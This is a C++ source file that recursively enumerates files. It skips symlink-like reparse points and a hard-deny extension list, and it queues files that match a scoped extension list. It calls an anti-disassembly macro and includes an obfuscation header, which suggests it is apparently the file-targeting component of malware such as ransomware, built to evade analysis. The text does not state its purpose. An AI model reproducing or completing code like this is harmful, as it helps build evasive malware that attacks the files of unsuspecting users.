#include "7layers.h"
#include "debug.h"
#include "obfuscation.h"
#include "filesys.h"

static std::string to_lower_ascii(std::string_view s) {
    std::string out;
    out.reserve(s.size());
    for (unsigned char c : s)
        out.push_back(static_cast<char>(std::tolower(c)));
    return out;
}

static bool is_reparse_point(const std::filesystem::path& p) noexcept {
    const DWORD a = ::GetFileAttributesW(p.c_str());
    if (a == INVALID_FILE_ATTRIBUTES) return false;
    return (a & FILE_ATTRIBUTE_REPARSE_POINT) != 0;
}

int enumerate_files(std::vector<std::string>* queue, std::string path, int depth, int max_depth) {
    ANTI_DISASM();

    if (!queue || path.empty()) return -1;
    
    if (depth > max_depth) {
        return -1;
    }

    std::error_code error_code;
    std::filesystem::directory_iterator it(
        path,
        std::filesystem::directory_options::skip_permission_denied,
        error_code
    );

    if (error_code) return -1;

    const std::filesystem::directory_iterator end;

    for (; it != end; ++it) {
        const auto& entry = *it;
        const auto& entry_path = entry.path();
        const auto& entry_str = entry_path.string();

        if (entry.is_directory()) {
            if (!is_reparse_point(entry_path)) {
                enumerate_files(queue, entry_str, depth + 1, max_depth);
            }
        } else if (entry.is_regular_file()) {
            int is_denied = 0;

            for (const auto& hard_deny : HARD_DENY_EXT) {
                const std::string& ext = hard_deny.extension;
                const std::string entry_ext = to_lower_ascii(entry_path.extension().string());
                if (entry_ext == ("." + ext)) {
                    is_denied = 1;
                    break;
                }
            }

            if (is_denied) {
                continue;
            }

            for (const auto& ext_scope : SCOPE_EXT_LIST) {
                const std::string& ext = ext_scope.extension;
                const std::string entry_ext = to_lower_ascii(entry_path.extension().string());
                if (entry_ext == ("." + ext)) {
                    queue->emplace_back(entry_str);
                    break;
                }
            }
        }
    }

    return 0;
}
